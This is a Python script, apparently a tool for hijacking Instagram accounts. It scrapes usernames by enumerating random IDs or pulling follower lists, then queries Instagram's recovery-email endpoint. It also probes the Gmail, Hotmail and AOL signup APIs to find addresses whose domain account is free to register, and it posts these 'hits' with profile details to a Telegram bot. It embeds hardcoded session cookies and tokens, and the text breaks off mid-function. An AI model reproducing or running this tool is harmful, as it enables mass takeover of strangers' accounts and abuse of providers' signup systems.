from requests import post as pp, get as gg;import random;import re;from user_agent import generate_user_agent as uu;import json;from uuid import uuid4;import time;from cfonts import render;import sys;import base64;import requests;import os;from concurrent.futures import ThreadPoolExecutor;from rich.console import Console;from rich.live import Live;import string;from threading import Thread;from asmix import Instagram;import threading
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import random
import string
import json
cook = None
agent = None
crumb = None
acrumb = None
sessionIndex = None
asId = None
import webbrowser

#url = "https://www.instagram.com/_98sf"
#webbrowser.open(url)
hits,bad, bad2, gig, p1, bv = 0,0,0,0,0,0

B="\033[1;30m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
Bl="\033[1;34m"
P="\033[1;35m"
C="\033[1;36m"
N="\033[1;37m"
A = '\033[2;34m'
C = '\033[1;34m'
E = '\033[1;33m'
J = "\033[1;31m"
I = '\033[1;32m'
G = '\033[1;97m'
H="\x1b[38;5;208m"

M = '\x1b[1;37m' 
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
j = random.randint(5,208)
jo = f'\x1b[38;5;{j}m'

cc = {
    'red': "\033[1m\033[31m",
    'green': "\033[1m\033[32m",
    'yellow': "\033[1m\033[33m",
    'blue': "\033[1m\033[34m",
    'cyan': "\033[1m\033[36m",
    'magenta': "\033[1m\033[35m",
    'white': "\033[1m\033[37m",
    'orange': "\033[1m\033[38;5;208m",
    'reset': "\033[0m"
}

def fs(id):
    sessionid = k.cookies['sessionid']
    global p1
    url = f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&search_surface=follow_list_pag'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    for i in r.json()['users']:
        p1+=1
        userL = i['username']
        sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
        with open('username.txt', 'a') as f:
        	f.write(userL+'\n')
    if 'HI' in listoo:
        m_id=r.json()['next_max_id']
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&max_id='+m_id+'&search_surface=follow_list_page',headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            print()
            try:
                for i in r.json()['users']:
                    p1+=1
                    userL = i["username"]
                    sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
                    with open('username.txt', 'a') as f:
                    	f.write(userL+'\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()
def fg(id):
    global p1
    url = f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    print()
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    
    for i in r.json()['users']:
        p1+=1
        userL = i['username']
        sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
        with open('username.txt', 'a') as f:
        	f.write(userL+'\n')
    if 'HI' in listoo:
        try:
            m_id=r.json()['next_max_id']
        except KeyError:
            exit()
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200&max_id='+m_id,headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            try:
                for i in r.json()['users']:
                    p1+=1
                    userL = i["username"]
                    sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
                    with open('username.txt', 'a') as f:
                    	f.write(userL+'\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()



def delet_list():
    banner()
    try:
        txt  = "username.txt"
        if os.path.exists(txt):
            os.system(f'rm -rf {txt}')
            print(f'\n - {R}𝐃𝐞𝐥𝐞𝐭𝐞𝐝')
            exit()
        else:
            print(f'\n - {R}𝐅𝐢𝐥𝐞 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭')
            exit()
    except Exception as e:
    	print(e)

def qqq():
  global bv
  memo = random.randint(100, 300)
  O = f'\x1b[38;5;{memo}m'
  while True:
    try:
      data = {
	    "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
	    "variables": json.dumps({
	    "id": int(random.randrange(10000, uid)), "render_surface": "PROFILE"}),
	    "doc_id": "25618261841150840"
	    }
      username = requests.post('https://www.instagram.com/api/graphql', headers={"X-FB-LSD": data["lsd"]},data=data).json()['data']['user']['username']
      bv+=1
      sys.stdout.write('\r'+G + str(bv) + f'{O}  </>  {G}' + username+'\r')
      
      with open('username.txt', 'a') as f:
        f.write(username+'\n')
    except:pass
    
def banner():
   

    print(f'''{C}░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

Tle:AHMED_KHANA

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝''')

    print('\033[1m' ,render('👻' , font='block', colors=['white' , 'red'], align='center', space=True))
    time.sleep(0.3)
    print(f'''{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}''')
banner()

token = input(f"- {R}𝐓𝐨𝐤𝐞𝐧 : {G}")
ID = input(f"- {R}𝐈𝐃 : {G}")
os.system('clear')
banner()

ExI = str(uuid4()).replace('-', '')

print(f'''
{Bl}𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 {R}  AHMED KHAN {Bl}𝐓𝐎𝐎𝐋 

{N}𝐂𝐇𝐎𝐎𝐒𝐄 𝐅𝐑𝐎𝐌 𝐍𝐔𝐌𝐁𝐄𝐑 

{R}1          {J} - {N}𝐃𝐄𝐋𝐄𝐓𝐄 𝐋𝐈𝐒𝐓 

{R}2           {J}- {N}𝐌𝐀𝐊𝐄 𝐋𝐈𝐒𝐓 

{R}3           {J}- {N}𝐂𝐇𝐄𝐊 𝐋𝐈𝐒𝐓 
''')    

ethan = int(input(f'{A}ᴄʜᴏᴏѕᴇ ɴᴜᴍʙᴇʀ   :  {N} '))
	
if ethan ==1:
	os.system('clear')
	delet_list()
elif ethan==2:
	os.system('clear')
	banner()
	print(f'''
{Bl}𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 {R}𝐋𝐄𝐆𝐄𝐍𝐃𝐒 {Bl}𝐓𝐎𝐎𝐋 

{N}𝐂𝐇𝐎𝐎𝐒𝐄 𝐅𝐑𝐎𝐌 𝐍𝐔𝐌𝐁𝐄𝐑 

{A}1          {bo} - {N}𝑅𝐴𝑁𝐷𝑂𝑀 𝐿𝐼𝑆𝑇 

{A}2           {bo}- {N}𝐿𝐼𝑆𝑇 𝐹𝑅𝑂𝑀 𝑈𝑆𝐸𝑅 ''')
	end = int(input(f'\n{A}ᴄʜᴏᴏѕᴇ ɴᴜᴍʙᴇʀ   :  {N} '))
	if end ==1:
		os.system('clear')
		banner()

		print(f'- {R}ᴅᴀᴛᴇ : 2011, 2012, 2013, 2014, 2015, 2022 ')
		num = int(input(f'- {J}ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ᴅᴀᴛᴇ ᴏꜰ ʏᴏᴜʀ ʟɪꜱᴛ | ᴇx: 2011 : {G}'))
		os.system('clear')
		banner()
		if num== 2011 :
			uid=18957417
		elif num== 2012 :
			uid=257924624
		elif num== 2013 :
			uid=361365132
		elif num== 2014 :
			uid=1682665388
		elif num== 2015 :
			uid=2682665388
		elif num== 2022 :
			uid=8682665388
		else:
			exit()
		from threading import Thread
		for _ in range(100):
			Thread(target=qqq).start()
		
	elif end==2:
		os.system('clear')
		banner()
		listoo = ['HI']    
		linux = 'clear'
		windows = 'cls'
		print('') 
		username = str(input(f'{J}ʏᴏᴜʀ ᴜꜱᴇʀɴᴀᴍᴇ {A} : {G}    '))
		password = str(input(f'{J}ʏᴏᴜʀ ʏᴏᴜʀ ᴘᴀꜱꜱᴡᴏʀᴅ {A} : {G}    '))
		print('')
		[linux, windows][os.name == 'nt']
		url = 'https://www.instagram.com/accounts/login/ajax/'
		data = {'username': f'{username}',
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
	        'queryParams': '{}',
	        'optIntoOneTap': 'false'}
	       
		headers = {'accept': '*/*',
	    'accept-encoding': 'gzip, deflate, br',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-length': '275',
	    'content-type': 'application/x-www-form-urlencoded',
	    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
	    'origin': 'https://www.instagram.com',
	    'referer': 'https://www.instagram.com/',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
	    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': '0',
	    'x-instagram-ajax': 'bc3d5af829ea',
	    'x-requested-with': 'XMLHttpRequest'}		
			
		k = requests.post(url,headers=headers,data=data)
		if 'authenticated":true' in k.text or 'userId' in k.text:
			pass
		else:
			print(f'{R}𝐁𝐀𝐃 𝐋𝐎𝐆𝐈𝐍')
			exit()
		([linux, windows][os.name == 'nt'])
		sessionid = k.cookies['sessionid']
		user = str(input(f'{J}ᴜѕᴇʀɴᴀᴍᴇ ᴏғ ᴛʜᴇ ʟɪꜱᴛ  {A} : {G}'))
		listoo = ['HI']
		rs_id = requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),
		headers={
		 'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
    'X-Requested-With': 'XMLHttpRequest',
    })
    		
		jsn3=rs_id.json()['data']['user']
		id_tr = jsn3['id']
		print('')
		os.system('clear')
		banner()
		print('')
		print(f''' 
	{A}1      {J} ~     {C} 𝙥𝙪𝙡𝙡 𝙛𝙧𝙤𝙢 𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜
	{A}2      {J} ~     {C}𝙥𝙪𝙡𝙡 𝙛𝙧𝙤𝙢 𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨
	''')
			
		o = str(input(f"{J}𝐂𝐇𝐎𝐎𝐒𝐄 𝐍𝐔𝐌𝐁𝐄𝐑 : {C}"))
		if o == '1':
			os.system('clear')
			banner()
			fg(id_tr)
		elif o == '2':
			os.system('clear')
			banner()
			fs(id_tr)
		else:
		  	print('    eror   ')
		  	exit()
elif ethan==3:
	def ply():
		sys.stdout.write('\r{}Hits{}:{}{}{}   {} |  {}BadEmail {}: {}{}{}   {} |  {}BadInsta {}: {}{}{}   {} |  {}GoodIG{}:{}{}{}\r'.format(
	            cc['white'], cc['green'], cc['cyan'], hits, cc['reset'], cc['white'],
	            cc['white'], cc['cyan'], R, bad, cc['reset'], cc['white'],
	            cc['white'], cc['cyan'],R, bad2, cc['reset'], cc['white'],
	            cc['white'], cc['green'], cc['cyan'], gig, cc['reset'],
	            
	        ))
	    
	def INFO(username, jj):
  
	    try:
	    	aa=Instagram.info(username)
	    	name=aa.get('name')
	    	followers=aa.get('followers')
	    	folling=aa.get('following')
	    	post=aa.get('post')
	    	date=aa.get('date')
	    	rest=Instagram.rest(username)
	    	ff = f"""
	┒
	┃ 𝗡𝗲𝘄 𝗵𝗶𝘁  𝗮𝗰𝗰𝗼𝘂𝗻𝘁
	┗
	════════════════
	⌊ Username ⌉  :  {username}
	⌊ Name ⌉   :  {name}
	⌊ Email ⌉  :  {username}@{jj}
	⌊ date ⌉   :  {date}
	⌊ post ⌉   :  {post}
	⌊ followers ⌉   :  {followers}
	⌊ following ⌉   :  {folling}
	⌊ rest ⌉ :  {rest}
	════════════════
	≣ By @AHMED_KHANA  - @p_y_hy
	        """
	
	        		
			   
	   		
			    	
	    	requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	    
	    except:
	    	rest=Instagram.rest(username)
	    	ff = f"""
	┒
	┃ 𝗡𝗲𝘄 𝗵𝗶𝘁  𝗮𝗰𝗰𝗼𝘂𝗻𝘁
	┗
	════════════════
	⌊ Username ⌉  :  {username}
	⌊ Email ⌉  :  {username}@{jj}
	⌊ Rest ⌉  :  {rest}
	
	https://www.instagram.com/{username}
	════════════════
	≣ By @AHMED_KHANA - @p_y_hy
	        """
	        		
		
	    	requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	while True:
	    try:
	        res = gg('https://signup.live.com/signup')
	        amsc = res.cookies.get_dict().get('amsc')
	        canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
	        cookies = {
	            'amsc': amsc,
	        }
	        headers = {
	            'authority': 'signup.live.com',
	            'accept': 'application/json',
	            'canary': canary,
	            'origin': 'https://signup.live.com',
	            'referer': 'https://signup.live.com/signup?lic=1&uaid=f26d1e8726944e3f9cc96aafdfdf8225',
	            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	        }
	
	        json_data = {
	            'clientExperiments': [
	                {
	                    'parallax': 'enablejspublickeydeprecationexperiment',
	                    'control': 'enablejspublickeydeprecationexperiment_control',
	                    'treatments': [
	                        'enablejspublickeydeprecationexperiment_treatment',
	                    ],
	                },
	            ],
	        }
	
	        response = pp(
	            'https://signup.live.com/API/EvaluateExperimentAssignments',
	            cookies=cookies,
	            headers=headers,
	            json=json_data,
	        ).json()
	        canary = response['apiCanary']
	        break
	    except Exception as e : pass
	
	def CCHOT(email):
			global hits, bad
			cookies = {
			    'amsc': amsc,
			}
			
			headers = {
			    'canary': canary,
			    'origin': 'https://signup.live.com',
			    'referer': 'https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
			}
			
			json_data = {
			    'signInName': email,
			}
			
			response = pp(
			    'https://signup.live.com/API/CheckAvailableSigninNames',
			    cookies=cookies,
			    headers=headers,
			    json=json_data,
			).text
			
			if '"isAvailable":true' in response:
				hits += 1
				username, jj = email.split('@')
				INFO(username, jj)
				ply()
			else:
				bad += 1
				ply()
	
	yy='azertyuiopmlkjhgfdsqwxcvbn'
	ids=[]
	def tll():
	    try:
	        n1 = ''.join(random.choice(yy) for i in range(random.randrange(6, 9)))
	        n2 = ''.join(random.choice(yy) for i in range(random.randrange(3, 9)))
	        host = ''.join(random.choice(yy) for i in range(random.randrange(15, 30)))
	        he3 = {
	            "accept": "*/*",
	            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	            "google-accounts-xsrf": "1",
	            'user-agent': str(uu()),
	        }
	        res1 = requests.get(
	            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
	            headers=he3
	        )
	        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
	        cookies = {
	            '__Host-GAPS': host
	        }
	        headers = {
	            'authority': 'accounts.google.com',
	            'accept': '*/*',
	            'accept-language': 'en-US,en;q=0.9',
	            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	            'google-accounts-xsrf': '1',
	            'origin': 'https://accounts.google.com',
	            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
	            'user-agent': uu(),
	        }
	        data = {
	            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
	            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
	        }
	        response = requests.post(
	            'https://accounts.google.com/_/signup/validatepersonaldetails',
	            cookies=cookies,
	            headers=headers,
	            data=data,
	        )
	        tl = str(response.text).split('",null,"')[1].split('"')[0]
	        host = response.cookies.get_dict()['__Host-GAPS']
	        with open('tl.txt', 'w') as f:
	            f.write(f'{tl}//{host}\n')
	    except Exception as e:
	        ''
	tll()
	
	def CCGMAIL(email):
	  global hits, bad
	  try:
	      
		  if '@' in email:
		    email = str(email).split('@')[0]
		  try:
		    try:
		      o=open('tl.txt','r').read().splitlines()[0]
		    except:
		      tll()
		      o=open('tl.txt','r').read().splitlines()[0]
		    tl,host = o.split('//')
		    cookies = {
		    '__Host-GAPS': host
		  }
		    headers = {
		    'authority': 'accounts.google.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9',
		    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		    'google-accounts-xsrf': '1',
		    'origin': 'https://accounts.google.com',
		    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
		    'user-agent': uu(),
		  }
		    params = {
		    'TL': tl,
		  }
		    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
		    response = pp(
		    'https://accounts.google.com/_/signup/usernameavailability',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		  )
		    if '"gf.uar",1' in str(response.text):
		    	hits+=1
		    	username, jj = email, 'gmail.com'
		    	INFO(username, jj)
		    	ply()
		    elif '"er",null,null,null,null,400' in str(response.text):
		      tll()
		      CCGMAIL(email)
		    else:
		    	bad+=1
		    	ply()
		  except:CCGMAIL(email)
	  except Exception as e:''
	def CCAOL(email):
		global hits, bad
		try:
		  if '@' in email:
		  	ex=email.split('@')[0]
		  else:
		   ex=email
		  first_names = ["Liam", "Olivia", "Noah", "Emma", "Ava", "Sophia", "James", "Isabella", "Gabriella", "Mia"]
		  last_names = ["Johnson", "Brown", "Davis", "Miller", "Wilson", "Taylor", "Moore", "Collins", "Anderson", "Thomas"]
		  first_name = random.choice(first_names)
		  last_name = random.choice(last_names)
		  chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
		  password = ''.join(random.choice(chars) for _ in range(12))
		  agent = generate_user_agent()
		  req = requests.get("https://login.aol.com/account/create", headers={
            'User-Agent': agent        })
        	
		  soup = BeautifulSoup(req.text, "html.parser")
		  crumb = soup.find("input", {"name": "crumb"}).get("value", "")
		  acrumb = soup.find("input", {"name": "acrumb"}).get("value", "")
		  sessionIndex = soup.find("input", {"name": "sessionIndex"}).get("value", "")
		  asId = soup.find("input", {"name": "asId"}).get("value", "")
		  cook = req.cookies.get_dict()
		  payload= {
            'specId': "yidregsimplified",
            'context': "REGISTRATION",
            'crumb': crumb,
            'acrumb': acrumb,
            'sessionIndex': sessionIndex,
            'tos0': "oath_freereg|us|en-US",
            'asId': asId,
            'firstName': first_name,
            'lastName': last_name,
            'userid-domain': "yahoo",
            'userId': ex,
            'password': password,
            'mm': str(random.randint(1, 12)),
            'dd': str(random.randint(1, 28)),
            'yyyy': random.randint(1990, 2002),
            'signup': ""}
            
                    	
        	
		  
		  headers= {
        	            'User-Agent': agent,
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://login.aol.com",
            'referer': "https://login.aol.com/account/create",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }

                    
            
        	
		  
		  res = requests.post(
        	            "https://login.aol.com/account/module/create?validateField=userId",
            data=payload,
            headers=headers,
            cookies=cook
        ).text
        
        	
        	
		  
		  if '{"errors":[]}' in res:
        		hits+=1
        		username, jj = ex, 'aol.com'
        		INFO(username, jj)
        		ply()
                    		
        	
        			  	
		  
		  else:
        		bad+=1
        		ply()
		except Exception as e:print(e)
	def CCINSTA(email):
		global bad2, gig
		
		try:
				headers = {
				    'User-Agent': str(uu()) ,
				    'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
				    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
				}
				data = {
				    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
				        '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
				        'adid': ExI ,
				        'guid': ExI ,
				        'device_id': ExI ,
				        'query': email
				    }),
				    'ig_sig_key_version': '4',
				}
				response = pp('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
				if 'ok' in str(response):
					gig += 1
					ply()
					if '@hotmail.com' in email:
						CCHOT(email)
					elif '@aol.com' in email:
						CCAOL(email)
					elif '@gmail.com' in email:
						CCGMAIL(email)
				else:
					bad2+=1
					ply()
		except Exception as e:
				''

	
	def kkk():
	    while True:
	        try:
	            data = {
	                "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
	                "variables": json.dumps({
	                    "id": int(random.randrange(10000, 8682665388)), "render_surface": "PROFILE"}),
	                "doc_id": "25618261841150840"
	            }
	            username = requests.post('https://www.instagram.com/api/graphql', headers={"X-FB-LSD": data["lsd"]}, data=data).json()['data']['user']['username']
	            return username
	        except:
	            pass
	
	def domain():
	    A = "\033[36m"
	    R = "\033[31m"
	    os.system('clear')
	    banner()
	    print(f"{R}𝟏 - {G}𝐆𝐦𝐚𝐢𝐥")
	    print(f"{R}𝟐 - {G}𝐇𝐨𝐭𝐦𝐚𝐢𝐥")
	    print(f"{R}𝟑 - {G}𝐀𝐨𝐥")
	    print(f"{R}𝟒 - {G}𝐀𝐥𝐥 𝐎𝐟 𝐓𝐡𝐢𝐬")
	    choice = input(f"\n- {R}𝐂𝐡𝐨𝐨𝐬𝐞 : {G} ")
	    os.system('clear')
	    banner()
	    return choice
	
	def generate_emails(user, choice):
	    emails = []
	    if choice == '1':
	        emails.append(user + '@gmail.com')
	    elif choice == '2':
	        emails.append(user + '@hotmail.com')
	    elif choice == '3':
	        emails.append(user + '@aol.com')
	    elif choice == '4':
	        emails.append(user + '@gmail.com')
	        emails.append(user + '@hotmail.com')
	        emails.append(user + '@aol.com')
	    return emails
	
	def main():
	    if not os.path.exists('username.txt'):
	        os.system('clear')
	        banner()
	        print(f"{R}𝐆𝐞𝐭 𝐋𝐢𝐬𝐭 𝐅𝐢𝐫𝐬𝐭")
	        return
	    
	    try:
	        with open('username.txt', 'r') as file:
	            users = file.readlines()
	    except:
	        os.system('clear')
	        banner()
	        print(f"{R}𝐆𝐞𝐭 𝐋𝐢𝐬𝐭 𝐅𝐢𝐫𝐬𝐭")
	        return
	    
	    choice = domain()
	    
	    all_emails = []
	    for user in users:
	        user = user.strip()
	        emails = generate_emails(user, choice)
	        all_emails.extend(emails)
	    
